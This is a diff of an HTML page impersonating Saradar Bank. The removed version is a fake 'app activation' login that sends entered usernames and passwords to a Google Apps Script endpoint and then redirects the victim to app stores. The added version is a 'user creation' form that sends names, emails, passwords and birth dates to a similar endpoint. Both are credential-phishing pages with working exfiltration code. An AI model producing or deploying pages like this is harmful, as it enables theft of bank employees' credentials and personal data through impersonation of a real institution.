@@ -1,151 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Saradar Bank — App Activation</title>
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Application User Creation</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
   <style>
-    :root{
+    :root {
       --saradar-red: #8C1C27;
       --saradar-red-600: #7a1820;
       --bg-start: #f7f7f9;
       --bg-end: #fff7f7;
-      --muted: #6b6b6b;
       --card: #ffffff;
     }
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:Inter, "Helvetica Neue", Arial, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-    body{
-      background:
-        radial-gradient(1200px 600px at 10% 10%, rgba(140,28,39,0.06), transparent 12%),
-        radial-gradient(900px 500px at 90% 90%, rgba(140,28,39,0.04), transparent 10%),
-        linear-gradient(180deg, var(--bg-start), var(--bg-end));
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:28px;
+    body {
+      background: linear-gradient(180deg, var(--bg-start), var(--bg-end));
+      font-family: Inter, "Helvetica Neue", Arial, sans-serif;
+      padding: 0;
+      margin: 0;
     }
-    .container{width:100%;max-width:1000px;display:grid;grid-template-columns: 1fr 420px;gap:28px;align-items:center;}
-    .hero{position:relative;overflow:hidden;border-radius:16px;padding:36px;background: linear-gradient(180deg, rgba(140,28,39,0.03), rgba(140,28,39,0.01));box-shadow: 0 10px 40px rgba(12,13,14,0.06);min-height:480px;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;}
-    .hero::before, .hero::after{content:"";position:absolute;border-radius:20%;filter: blur(36px);opacity:0.12;transform: rotate(12deg);}
-    .hero::before{width:420px;height:420px; right:-80px; top:-120px;background: linear-gradient(45deg, var(--saradar-red), rgba(140,28,39,0.4));}
-    .hero::after{width:300px;height:300px; left:-120px; bottom:-80px;background: linear-gradient(135deg, rgba(140,28,39,0.12), rgba(140,28,39,0.02));}
-    .hero .badge{display:inline-flex;align-items:center;gap:12px;background: rgba(140,28,39,0.06);padding:8px 12px;border-radius:999px;color:var(--saradar-red-600);font-weight:600;margin-bottom:18px;border:1px solid rgba(140,28,39,0.06);}
-    .hero h1{margin:0 0 14px 0;color:var(--saradar-red);font-size:34px;line-height:1.02;letter-spacing:-0.02em;}
-    .hero p{margin:0;color:var(--muted);font-size:16px;max-width:640px;line-height:1.5;}
-    .hero .points{margin-top:18px;display:flex;gap:12px;flex-wrap:wrap;}
-    .chip{background:white;border-radius:10px;padding:10px 14px;box-shadow:0 6px 18px rgba(12,13,14,0.04);font-weight:600;color:var(--saradar-red-600);display:inline-flex;gap:8px;align-items:center;}
-    .card{background:var(--card);border-radius:14px;padding:26px;box-shadow: 0 12px 36px rgba(12,13,14,0.07);}
-    .brand{display:flex;align-items:center;gap:12px;margin-bottom:16px;}
-    .brand img{height:46px;width:auto;display:block;}
-    .brand .title{color:var(--saradar-red);font-weight:700;font-size:18px;}
-    .card h2{margin:0 0 8px 0;font-size:20px;color:#111;}
-    .card p.lead{margin:0 0 18px 0;color:var(--muted);font-size:14px;}
-    .form-row{margin-bottom:12px;}
-    input[type="text"], input[type="password"]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(0,0,0,0.06);font-size:15px;transition: box-shadow .12s ease, border-color .12s ease;outline:none;}
-    input:focus{border-color: var(--saradar-red);box-shadow: 0 6px 20px rgba(140,28,39,0.06);}
-    .btn{width:100%;padding:12px 14px;border-radius:10px;background: linear-gradient(180deg, var(--saradar-red), var(--saradar-red-600));color:#fff;border:0;font-weight:700;font-size:15px;cursor:pointer;box-shadow: 0 8px 24px rgba(140,28,39,0.14);}
-    .btn:active{transform:translateY(1px);}
-    .note{font-size:13px;color:var(--muted);margin-top:12px;text-align:center;}
-    .footer-links{display:flex;gap:8px;justify-content:center;margin-top:14px;}
-    .footer-links a{color:var(--saradar-red);text-decoration:none;font-weight:600;font-size:13px;}
-    @media (max-width:920px){.container{grid-template-columns:1fr;padding:0 18px;}.hero{order:-1;min-height:280px;padding:20px;}}
+    .hero {
+      background: linear-gradient(135deg, var(--saradar-red), var(--saradar-red-600));
+      color: #fff;
+      text-align: center;
+      padding-bottom: 60px;
+    }
+    .brand-logo img {
+      height: 140px; /* Bigger logo */
+      width: auto;
+      background: #fff;
+      border-radius: 20px;
+      padding: 12px 18px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+    }
+    .hero h1.title {
+      color: #fff;
+      font-weight: 800;
+      font-size: 2.4rem;
+      margin-top: 25px;
+    }
+    .tagline {
+      color: #ffeaea;
+      font-size: 1.1rem;
+      margin-top: 10px;
+      font-style: italic;
+    }
+    .card {
+      border-radius: 20px;
+      padding: 35px;
+      box-shadow: 0 14px 40px rgba(12,13,14,0.12);
+      background-color: var(--card);
+      max-width: 650px;
+      margin: -70px auto 40px auto;
+      position: relative;
+      z-index: 2;
+    }
+    .chips {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 25px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .chip {
+      background: var(--saradar-red);
+      border-radius: 20px;
+      padding: 8px 16px;
+      font-weight: 600;
+      color: #fff;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+      font-size: 0.9rem;
+    }
+    .field label.label {
+      font-weight: 600;
+      color: #333;
+    }
+    .input, .textarea {
+      border-radius: 12px;
+      border: 1px solid #ddd;
+    }
+    .input:focus, .textarea:focus {
+      border-color: var(--saradar-red);
+      box-shadow: 0 0 6px rgba(140,28,39,0.4);
+    }
+    button.button.is-primary {
+      background: var(--saradar-red);
+      border-radius: 25px;
+      font-weight: 600;
+    }
+    button.button.is-primary:hover {
+      background: var(--saradar-red-600);
+    }
+    button.button.is-danger {
+      border-radius: 25px;
+    }
+    #message {
+      display: none;
+      margin: 20px auto;
+      max-width: 600px;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
-  <main class="container" role="main">
-    <section class="hero">
-      <div class="badge"> <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="opacity:0.9"><path d="M3 12h18" stroke="currentColor" stroke-width="2" stroke-linecap="round" /></svg> App Update</div>
-      <h1>Activate the Saradar Mobile App</h1>
-      <p>We’re rolling out a new mobile app update that strengthens security and improves performance. Activating the app only takes a few moments — scan the QR on your desktop or follow the steps on your mobile device to confirm activation.</p>
-      <div class="points">
-        <div class="chip">Fast activation</div>
-        <div class="chip">Enhanced security</div>
-        <div class="chip">Biometric support</div>
+  <!-- Hero Header -->
+  <section class="hero is-medium is-bold">
+    <div class="hero-body">
+      <div class="container">
+        <div class="brand-logo">
+          <img src="logo.png" alt="Saradar Bank Logo" />
+        </div>
+        <h1 class="title">Application User Creation</h1>
+        <div class="tagline">Secure • Fast • Reliable</div>
       </div>
-    </section>
+    </div>
+  </section>
 
-    <aside class="card">
-      <div class="brand">
-        <img src="logo.png" alt="Saradar Bank logo" />
-        <div class="title">Saradar Bank </div>
-      </div>
+  <!-- Card Form -->
+  <div class="card">
+    <div class="chips">
+      <div class="chip">Bank Grade Security</div>
+      <div class="chip">Quick Setup</div>
+      <div class="chip">User Friendly</div>
+    </div>
 
-      <h2 id="login-title">Login to Activate App</h2>
-      <p class="lead">Enter your corporate credentials to confirm your device activation. After submission you will be redirected to the appropriate app store.</p>
-
-      <div class="form-row">
-        <input id="username" type="text" placeholder="Username" autocomplete="username" />
-      </div>
-
-      <div class="form-row">
-        <input id="password" type="password" placeholder="Password" autocomplete="current-password" />
-      </div>
-
-      <div class="form-row">
-        <button id="submitBtn" class="btn" onclick="handleSubmit()">Submit</button>
+    <form id="form">
+      <div class="field">
+        <label class="label">Employee Name</label>
+        <div class="control">
+          <input class="input" type="text" name="Employee Name" placeholder="Employee Name" required>
+        </div>
       </div>
 
-      <div class="note">If you encounter issues, contact IT Helpdesk via the Service Portal.</div>
-
-      <div class="footer-links">
-        <a href="#">Privacy</a>
-        <a href="#">Support</a>
-        <a href="#">Legal</a>
+      <div class="field">
+        <label class="label">Email</label>
+        <div class="control">
+          <input class="input" type="email" name="Email" placeholder="Enter Email" required>
+        </div>
       </div>
-    </aside>
-  </main>
+
+      <div class="field">
+        <label class="label">Password</label>
+        <div class="control">
+          <input class="input" type="password" name="Password" placeholder="Enter Password" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">Date of Birth</label>
+        <div class="control">
+          <input class="input" type="date" name="DOB" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">Gender</label>
+        <div class="control">
+          <label class="radio"><input type="radio" name="Gender" value="Male" required> Male</label>
+          <label class="radio"><input type="radio" name="Gender" value="Female"> Female</label>
+        </div>
+      </div>
+
+      <div class="field">
+        <label class="label">Additional Information</label>
+        <div class="control">
+          <textarea class="textarea" name="Notes" placeholder="Any additional information"></textarea>
+        </div>
+      </div>
+
+      <div class="field is-grouped">
+        <div class="control">
+          <button type="submit" class="button is-primary" id="submit-button">Submit</button>
+        </div>
+        <div class="control">
+          <button type="button" class="button is-danger" onclick="form.reset(); messageDiv.style.display='none';">Cancel</button>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <div id="message"></div>
 
   <script>
-    const PLAY_STORE = "https://play.google.com/store/apps/details?id=com.example.app";
-    const APP_STORE = "https://apps.apple.com/app/id123456789";
-    const FALLBACK = "https://www.saradarbank.com";
+    const form = document.getElementById("form");
+    const submitButton = document.getElementById("submit-button");
+    const messageDiv = document.getElementById("message");
 
-    const SHEET_URL = "https://script.google.com/macros/s/AKfycbwIJWmcfpsNekaCDlvFZWbDf4BkrdqcBS1zYuEQ2VhSD6JCOxXPHrmTlDZ9BXqs_QRdAg/exec";
+    form.addEventListener("submit", async function(e) {
+      e.preventDefault();
 
-    function handleSubmit() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const btn = document.getElementById('submitBtn');
-      btn.disabled = true;
-      btn.innerText = "Processing...";
+      messageDiv.textContent = "Submitting...";
+      messageDiv.style.display = "block";
+      messageDiv.style.backgroundColor = "#f7f7f7";
+      messageDiv.style.color = "#111";
+      submitButton.disabled = true;
+      submitButton.classList.add("is-loading");
 
-      // Send JSON data to Google Sheet
-      fetch(SHEET_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      }).then(() => {
-        console.log("Data sent to Google Sheets");
-      }).catch(err => {
-        console.error("Error sending data:", err);
-      });
+      try {
+        const formData = new FormData(this);
+        const formBody = new URLSearchParams(formData).toString();
 
-      // Redirect logic
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      const isAndroid = /android/i.test(ua);
-      const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
+        const response = await fetch(
+          "https://script.google.com/macros/s/AKfycbxzjxw1sOGdWw3rsgHvWubDQtAeMH13TVuKH32Vx4itxbVOZsErlZD6mjZJGGo5odhKkA/exec",
+          {
+            method: "POST",
+            body: formBody,
+          }
+        );
 
-      setTimeout(() => {
-        if (isAndroid) window.location.href = PLAY_STORE;
-        else if (isIOS) window.location.href = APP_STORE;
-        else window.location.href = FALLBACK;
-      }, 800);
-    }
+        messageDiv.textContent = "Data Submitted Successfully!";
+        messageDiv.style.backgroundColor = "#8C1C27"; // Saradar red
+        messageDiv.style.color = "#fff";
+        form.reset();
 
-    // Enter key also submits
-    document.addEventListener('keydown', (e)=>{
-      if (e.key === 'Enter') {
-        if (['username','password'].includes(document.activeElement.id)) {
-          e.preventDefault();
-          handleSubmit();
-        }
+      } catch (error) {
+        console.error("Error:", error);
+        messageDiv.textContent = "Error: " + error.message;
+        messageDiv.style.backgroundColor = "#f14668";
+        messageDiv.style.color = "#fff";
+      } finally {
+        submitButton.disabled = false;
+        submitButton.classList.remove("is-loading");
+        setTimeout(() => { messageDiv.style.display = "none"; }, 4000);
       }
     });
   </script>
 </body>
 </html>
-
-
-
